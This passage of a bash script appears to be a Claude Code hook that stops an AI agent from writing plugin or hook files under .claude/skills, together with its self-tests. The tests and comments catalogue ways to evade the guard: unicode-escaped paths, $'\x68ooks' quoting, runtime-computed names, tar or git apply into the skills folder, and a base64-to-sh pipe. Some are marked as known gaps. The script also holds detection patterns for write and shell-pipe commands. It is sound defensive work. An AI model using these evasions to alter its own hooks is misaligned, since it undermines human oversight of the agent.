  _tv "sed w"               "sed -n 'w .claude/skills/x/hooks/h' docs/a"
  _tv "sort -o"             "sort -o .claude/skills/x/hooks/h docs/a"
  _c TETO "git init e escrita na mesma string" Bash "git init -q ${d}/novo && printf x > ${d}/novo/.claude/skills/y/hooks/h"
  _c TETO "base64 -d | sh"                 Bash  "echo cHJpbnRm | base64 -d | sh"
  _c TETO "git apply"                      Bash  "git apply /tmp/plugin.patch"
  _c TETO "tar -x na pasta de skills, conteúdo opaco" Bash "tar -xf /tmp/p.tar -C .claude/skills"
  _c TETO "nome calculado em runtime"      Bash  "cat > \"\$(cat /tmp/nome)\" <<'E'
{}
E"
  # ── os ramos de fechamento, com JSON escrito à mão, sem python no caminho do caso ──
  _raw() {  # _raw <esperado rc> <nome> <json> [dir-do-hook] [PATH]
    local want="$1" name="$2" json="$3" hook="${4:-${self}}" pth="${5:-${PATH}}" rc=0
    case "${name}" in *"${PW_SELFTEST_ONLY:-}"*) : ;; *) return 0 ;; esac
    # o hook cai no diretório de quem chama quando o JSON não traz `cwd`: a bancada fixa o projeto, rodando de qualquer pasta
    printf '%s' "${json}" | ( cd "${p}" && CLAUDE_PROJECT_DIR="${rawproj:-${p}}" HOME="${rawhome:-${d}/home}" PATH="${pth}" bash "${hook}" ) >/dev/null 2>&1 || rc=$?
    if [ "${rc}" -eq "${want}" ]; then printf 'ok   %-5s %s\n' "$([ "${want}" = 2 ] && echo acusa || echo cala)" "${name}"
    else printf '✗    %-5s %s (rc=%s)\n' "${want}" "${name}" "${rc}"; fails=$((fails + 1)); fi
  }
  _raw 2 "Write com escape unicode no caminho" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.clau\u0064e/skills/x/hooks/h"},"cwd":"'"${p}"'"}'
  # análise que não chega ao fim: o juiz sem o MOAT que ele compõe
  sj="${d}/semjuiz"; mkdir -p "${sj}/lib"; cp "${self}" "${sj}/g.sh"; cp "${here}/lib/invocation-lines.sh" "${here}/lib/plugin-write-judge.py" "${sj}/lib/"
  _raw 2 "análise incompleta fecha o caminho com verbo" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${sj}/g.sh"
  _raw 0 "análise incompleta cala a leitura" '{"tool_name":"Bash","tool_input":{"command":"grep -rn .claude/skills/x/hooks docs"},"cwd":"'"${p}"'"}' "${sj}/g.sh"
  # sem python3: o Write decide em bash, e o Bash fecha só o caminho inteiro com verbo de escrita
  np="${d}/nopy"; mkdir -p "${np}"
  for _b in bash cat grep sed awk head tr realpath dirname git; do _bp="$(command -v "${_b}")" && ln -sf "${_bp}" "${np}/${_b}"; done
  _raw 0 "sem python3: Write honesto passa" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/docs/a.md"},"cwd":"'"${p}"'"}' "${self}" "${np}"
  _raw 2 "sem python3: Write no alvo barra" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${self}" "${np}"
  _raw 2 "sem python3: Bash com verbo fecha" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${self}" "${np}"
  _raw 0 "sem python3: Bash em hooks fundo cala" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/references/hooks/a.md"},"cwd":"'"${p}"'"}' "${self}" "${np}"
  _raw 0 "sem python3: Bash de leitura cala" '{"tool_name":"Bash","tool_input":{"command":"grep -rn .claude/skills/x/hooks docs"},"cwd":"'"${p}"'"}' "${self}" "${np}"
  # a raiz, com a casa por link e o projeto sem git
  rawhome="${d}/home-link" _raw 2 "Write na casa, com HOME por link" '{"tool_name":"Write","tool_input":{"file_path":"'"${d}"'/home/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}'
  rawhome="${d}/home-link" _raw 2 "Bash na casa, com HOME por link" '{"tool_name":"Bash","tool_input":{"command":"printf x > '"${d}"'/home/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}'
  rawproj="${d}/semgit" _raw 2 "projeto sem git: Write barra" '{"tool_name":"Write","tool_input":{"file_path":"'"${d}"'/semgit/.claude/skills/y/hooks/h"},"cwd":"'"${d}"'/semgit"}'
  rawproj="${d}/semgit" _raw 2 "projeto sem git: Bash barra" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/y/hooks/h"},"cwd":"'"${d}"'/semgit"}'
  rawproj="${d}/semgit" _raw 2 "projeto sem git: o alvo da skill que é link entra" '{"tool_name":"Write","tool_input":{"file_path":"'"${d}"'/fora/alvo-semgit/hooks/h"},"cwd":"'"${d}"'/semgit"}'
  _raw 0 "raiz sem git que não é o projeto: Write passa" '{"tool_name":"Write","tool_input":{"file_path":"'"${d}"'/semgit/.claude/skills/y/hooks/h"},"cwd":"'"${p}"'"}'
  _raw 0 "raiz sem git que não é o projeto: Bash passa" '{"tool_name":"Bash","tool_input":{"command":"printf x > '"${d}"'/semgit/.claude/skills/y/hooks/h"},"cwd":"'"${p}"'"}'
  # a raiz é teste de arquivo: GIT_DIR e GIT_WORK_TREE no ambiente não mudam nada
  GIT_DIR=/nada GIT_WORK_TREE=/nada _raw 2 "GIT_DIR no ambiente: Write na worktree barra" '{"tool_name":"Write","tool_input":{"file_path":"'"${d}"'/wt/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}'
  GIT_DIR=/nada GIT_WORK_TREE=/nada _raw 2 "GIT_DIR no ambiente: Bash na worktree barra" '{"tool_name":"Bash","tool_input":{"command":"printf x > '"${d}"'/wt/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}'
  # o gatilho por cwd é custo, não veredito: um python falso conta quem o paga
  gp="${d}/gatilho"; mkdir -p "${gp}" "${p}/.claude/worktrees/a/docs"
  for _b in bash cat grep sed awk head tr realpath dirname git; do _bp="$(command -v "${_b}")" && ln -sf "${_bp}" "${gp}/${_b}"; done
  printf '#!/bin/sh\n: > "%s/gatilho.marca"\nexit 1\n' "${d}" > "${gp}/python3"; chmod +x "${gp}/python3"
  _g() {  # _g <paga|nao> <nome> <comando> <cwd>
    local want="$1" name="$2" got=nao; shift 2
    case "${name}" in *"${PW_SELFTEST_ONLY:-}"*) : ;; *) return 0 ;; esac
    rm -f "${d}/gatilho.marca"
    printf '{"tool_name":"Bash","tool_input":{"command":"%s"},"cwd":"%s"}' "$1" "$2" | CLAUDE_PROJECT_DIR="${p}" HOME="${d}/home" PATH="${gp}" bash "${self}" >/dev/null 2>&1
    [ -e "${d}/gatilho.marca" ] && got=paga
    if [ "${got}" = "${want}" ]; then printf 'ok   %-5s %s\n' "$([ "${want}" = paga ] && echo acusa || echo cala)" "${name}"
    else printf '✗    %-5s %s (%s)\n' "${want}" "${name}" "${got}"; fails=$((fails + 1)); fi
  }
  _g nao "gatilho: cwd em .claude/hooks não paga o python" "echo x > a" "${p}/.claude/hooks"
  _g nao "gatilho: cwd em worktree de agente não paga o python" "git status" "${p}/.claude/worktrees/a/docs"
  _g nao "gatilho: cwd em .claude/worktrees não paga o python" "echo x > a" "${p}/.claude/worktrees"
  _g paga "gatilho: cwd em .claude paga o python" "echo x > a" "${p}/.claude"
  _g paga "gatilho: cwd na skill paga o python" "echo x > a" "${p}/.claude/skills/x"
  # a mensagem diz onde o plugin mora: é o que o clone da porta lê quando o gate trava
  case "a mensagem do veto diz onde o plugin mora" in *"${PW_SELFTEST_ONLY:-}"*)
    _m="$(printf '%s' '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' | CLAUDE_PROJECT_DIR="${p}" HOME="${d}/home" bash "${self}" 2>&1 >/dev/null)"
    case "${_m}" in
      *"mecanismo próprio"*) echo 'ok   acusa a mensagem do veto diz onde o plugin mora' ;;
      *) printf '✗    acusa a mensagem do veto diz onde o plugin mora (%s)\n' "${_m}"; fails=$((fails + 1)) ;;
    esac ;;
  esac
  # a lib do tokenizador ausente ou vazia: o Write não depende dela, e o Bash fecha o caminho com verbo
  sl="${d}/semlib"; mkdir -p "${sl}/lib"; cp "${self}" "${sl}/g.sh"; cp "${here}/lib/plugin-write-judge.py" "${sl}/lib/"
  vl="${d}/libvazia"; mkdir -p "${vl}/lib"; cp "${self}" "${vl}/g.sh"; : > "${vl}/lib/invocation-lines.sh"
  _raw 2 "sem lib: Write no alvo barra" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${sl}/g.sh"
  _raw 0 "sem lib: Write honesto passa" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/docs/a.md"},"cwd":"'"${p}"'"}' "${sl}/g.sh"
  _raw 2 "sem lib: Bash com verbo fecha" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${sl}/g.sh"
  _raw 0 "sem lib: Bash de leitura cala" '{"tool_name":"Bash","tool_input":{"command":"grep -rn .claude/skills/x/hooks docs"},"cwd":"'"${p}"'"}' "${sl}/g.sh"
  _raw 2 "lib vazia: Write no alvo barra" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${vl}/g.sh"
  _raw 2 "lib vazia: Bash com verbo fecha" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/hooks/h"},"cwd":"'"${p}"'"}' "${vl}/g.sh"
  # JSON truncado em Bash: o que veio depois da chave é o comando
  _raw 2 "JSON truncado: Bash no alvo barra" '{"tool_name":"Bash","tool_input":{"command":"printf x > .claude/skills/x/hooks/h'
  _raw 0 "JSON truncado: Bash de leitura cala" '{"tool_name":"Bash","tool_input":{"command":"cat .claude/skills/x/hooks/h'
  # TETO: o Write com JSON truncado não tem campo que feche, e sai rc 0 (declarado no cabeçalho)
  _raw 0 "TETO JSON truncado: Write no alvo passa" '{"tool_name":"Write","tool_input":{"file_path":"'"${p}"'/.claude/skills/x/hooks/h'
  if [ "${fails}" -eq 0 ]; then echo "plugin-write-guard --selftest: OK"; exit 0; fi
  echo "plugin-write-guard --selftest: ${fails} falha(s)"; exit 1
fi

# ───────────────────────────── o veto ─────────────────────────────
input="$(cat)"
tool="$(printf '%s' "${input}" | _pw_json_field tool_name)" || tool=""

case "${tool}" in
  Write|Edit|NotebookEdit|MultiEdit)
    # caminho quente: sem python. Toda edição da casa passa aqui
    field=file_path; [ "${tool}" = NotebookEdit ] && field=notebook_path
    path="$(printf '%s' "${input}" | _pw_json_field "${field}")" || exit 0
    hcwd="$(printf '%s' "${input}" | _pw_json_field cwd)" || hcwd=""
    case "${path}" in
      *'\u'*) path="$(printf '%s' "${input}" | python3 -I -c 'import json,sys
ti=json.load(sys.stdin).get("tool_input") or {}
print(ti.get("file_path") or ti.get("notebook_path") or "")' 2>/dev/null)" || exit 0 ;;
    esac
    case "${path}" in
      "~/"*) path="${HOME:-}/${path#"~/"}" ;;
      /*) : ;;
      *) path="${hcwd:-${CLAUDE_PROJECT_DIR:-$PWD}}/${path}" ;;
    esac
    # como ESCRITO (normalizado) e RESOLVIDO: a skill que é link para fora só aparece na 1ª forma, o link em docs/ só na 2ª
    spelled="$(realpath -ms -- "${path}" 2>/dev/null)" || spelled="${path}"
    real="$(realpath -m -- "${path}" 2>/dev/null)" || real="${path}"
    if _pw_is_plugin_path "${spelled}" || _pw_is_plugin_path "${real}"; then
      _pw_deny "${tool} em ${path}"
    fi
    targets="$(_pw_link_targets)"
    if [ -n "${targets}" ] && { _pw_is_link_target_form "${spelled}" "${targets}" || _pw_is_link_target_form "${real}" "${targets}"; }; then
      _pw_deny "${tool} em ${path}, a pasta de fora de uma skill que é link"
    fi
    exit 0 ;;
  Bash) : ;;
  *) exit 0 ;;
esac

# JSON truncado: o campo não fecha, e o que veio depois da chave é o comando
raw_cmd="$(printf '%s' "${input}" | _pw_json_field command)" || raw_cmd="$(printf '%s' "${input}" | sed -E 's/^.*"command"[[:space:]]*:[[:space:]]*"//')"
hcwd0="$(printf '%s' "${input}" | _pw_json_field cwd)" || hcwd0=""
[ -d "${hcwd0}" ] || hcwd0="${PWD}"
flat="$(printf '%s' "${raw_cmd}" | tr -d "\"'\\\\")"

# ── pré-filtro sem python: SUPERCONJUNTO do que o juiz pode vetar ──────────────────────────────────
# (1) o sinal literal, em builtin de string (o `cd .claude/skills/x` e o `> hooks/h` podem vir em linhas diferentes);
# (2) cópia/link para dentro de skills (a pasta com a forma de plugin não traz o sinal no texto); (3) script não
# versionado, que o juiz lê; (4) symlink já no disco no caminho de um comando que escreve.
pw_write='(^|[^[:alnum:]_-])(rsync|cp|mv|install|tee|ln|dd|tar|sed|touch|mkdir|chmod|chown|curl|wget)([^[:alnum:]_-]|$)|>'
pw_script='(^|[;&|(`[:space:]])(bash|sh|zsh|dash|ksh|source|\.)[[:space:]]+[^-[:space:]]|\.sh([^[:alnum:]_]|$)|(^|[;&|(`[:space:]])\./|\|[[:space:]]*(ba|z|da|k)?sh([[:space:]]|$)'
hit=0
case "${flat}" in
  *.claude-plugin*) hit=1 ;;
  *skills*hooks*|*hooks*skills*) hit=1 ;;
  *skills*\{*) hit=1 ;;
  *skills*) grep -qE '(^|[^[:alnum:]_-])(cp|mv|ln|rsync)([^[:alnum:]_-]|$)' <<< "${flat}" && hit=1 ;;
esac
# (4b) `$'…'` e `$"…"` escondem o nome do texto achatado (`$'\x68ooks'`): com `skills` na string, o juiz decodifica
case "${raw_cmd}" in *skills*"\$'"*|*skills*'$"'*) hit=1 ;; esac
# (5) o `cwd`: em `.claude/skills/x`, `mkdir hooks` não traz sinal nenhum no texto
# Só `.claude` e skills: `*.claude*` fazia toda chamada numa worktree de `.claude/worktrees/` pagar o python (38 → 196 ms, medido)
case "${hcwd0}" in */.claude|*/.claude/skills*) hit=1 ;; esac
pw_unversioned_script() {
  local t d="${hcwd0}"
  grep -qE '\|[[:space:]]*(ba|z|da|k)?sh([[:space:]]|$)' <<< "${raw_cmd}" && return 0
  while IFS= read -r t; do
    [ -z "${t}" ] && continue
    case "${t}" in *'$'*|*'`'*|'~'*) return 0 ;; esac
    git -C "${d}" ls-files --error-unmatch -- "${t}" >/dev/null 2>&1 || return 0
  done < <(printf '%s\n' "${flat}" \
             | grep -oE '(^|[;&|(`[:space:]])(bash|sh|zsh|dash|ksh|source|\.)[[:space:]]+[^-[:space:];&|][^[:space:];&|]*|[^[:space:];&|<>]*\.sh([^[:alnum:]_]|$)|(^|[;&|(`[:space:]])\./[^[:space:];&|]*' \
             | sed -E 's/^[;&|(`[:space:]]*//; s/^(bash|sh|zsh|dash|ksh|source|\.)[[:space:]]+//; s/[^[:alnum:]_./~$`-]+$//')
  return 1
}
pw_cites_symlink() {
  # toda palavra, com ou sem barra (`echo x > docs-l`), e seguindo o `cd` literal. Roda num subshell: o `cd` não vaza
  local t c prev=""
  while IFS= read -r t; do
    [ -n "${t}" ] || continue
    case "${prev}:${t}" in cd:--|cd:-[LPe@]*|pushd:--|pushd:-[LPe@]*) continue ;; esac
    case "${t}" in
      '~/'*) t="${HOME:-}/${t#'~/'}" ;;
      '$HOME/'*) t="${HOME:-}/${t#'$HOME/'}" ;;
      '${HOME}/'*) t="${HOME:-}/${t#'${HOME}/'}" ;;
    esac
    t="${t%/}"; c="${t}"
    while [ -n "${c}" ] && [ "${c}" != "/" ] && [ "${c}" != "." ]; do
      [ -L "${c}" ] && return 0
      case "${c}" in */*) c="${c%/*}" ;; *) break ;; esac
    done
    case "${prev}" in cd|pushd) cd -- "${t}" 2>/dev/null ;; esac
    prev="${t}"
  done < <(tr -s '[:space:];&|<>=()' '\n' <<< "${flat}" | head -n 256)
  return 1
}
[ "${hit}" = 0 ] && grep -qE "${pw_script}" <<< "${raw_cmd}" && pw_unversioned_script && hit=1
if [ "${hit}" = 0 ] && grep -qE "${pw_write}" <<< "${flat}"; then
  ( cd "${hcwd0}" 2>/dev/null ; pw_cites_symlink ) && hit=1
fi
targets="$(_pw_link_targets)"
if [ "${hit}" = 0 ] && [ -n "${targets}" ]; then
  while IFS= read -r t; do
    case "${flat}" in *"${t}"*) hit=1 ;; esac
    case "${hcwd0}/" in "${t}"/*) hit=1 ;; esac
  done <<< "${targets}"
fi
[ "${hit}" = 0 ] && exit 0

# ── leitura exata do JSON + juiz ──────────────────────────────────────────────────────
parsed="$(printf '%s' "${input}" | python3 -I -c 'import json,sys
sys.stdout.reconfigure(errors="backslashreplace")
try: d=json.load(sys.stdin)
except Exception: d={}
d=d if isinstance(d,dict) else {}
ti=d.get("tool_input"); ti=ti if isinstance(ti,dict) else {}
print(str(d.get("cwd") or "").replace("\n"," ")); print(str(ti.get("command") or ""))' 2>/dev/null)" && nopy=0 || nopy=1
hcwd="${parsed%%$'\n'*}"; cmd="${parsed#*$'\n'}"; [ "${cmd}" = "${parsed}" ] && cmd=""
if [ "${nopy}" = 1 ]; then
  hcwd="${hcwd0}"
  cmd="${raw_cmd}"
fi
[ -d "${hcwd}" ] || hcwd="${hcwd0}"
[ -z "${cmd}" ] && cmd="${raw_cmd}"                 # JSON truncado: o python não leu, e o texto ainda é o comando
[ -z "${cmd}" ] && exit 0

_pw_closed() {  # SEM tokenizador: fecha SÓ o caminho inteiro junto de verbo de escrita; o resto cala (cláusula 4)
  grep -qE '\.claude/skills/[^/[:space:]]+/(\.claude-plugin|hooks)(/|[[:space:]]|$)' <<< "${flat}" && grep -qE "${pw_write}" <<< "${flat}" || exit 0
  _pw_deny "$1, e o comando cita um caminho de plugin em .claude/skills junto de um verbo de escrita. Fechado por segurança"
}
[ "${nopy}" = 1 ] && _pw_closed "python3 ausente ou quebrado"
# shellcheck source=lib/invocation-lines.sh
. "${here}/lib/invocation-lines.sh" 2>/dev/null
type onion_invocation_lines >/dev/null 2>&1 || _pw_closed "a lib do tokenizador faltou ou veio vazia"
out="$(PW_LINK_TARGETS="${targets}" ONION_CWD="${hcwd}" ONION_MOAT_JUDGE="${here}/lib/plugin-write-judge.py" onion_invocation_lines "${cmd}")"
grep -qx '__ONION_MOAT_OK__' <<< "${out}" || _pw_closed "a análise não chegou ao fim"
line="$(printf '%s\n' "${out}" | grep -m1 '^__ONION_MOAT__' || true)"
[ -z "${line}" ] && exit 0
IFS=$'\t' read -r _ cls target _ detail <<< "${line}"
case "${cls}" in
  plugin) _pw_deny "${detail}" ;;
  *)      _pw_deny "o texto cita um caminho de plugin em .claude/skills junto de um verbo de escrita, e o destino não se prova (${detail}). Reescreva com o destino literal, sem eval nem nome de comando em variável" ;;
esac
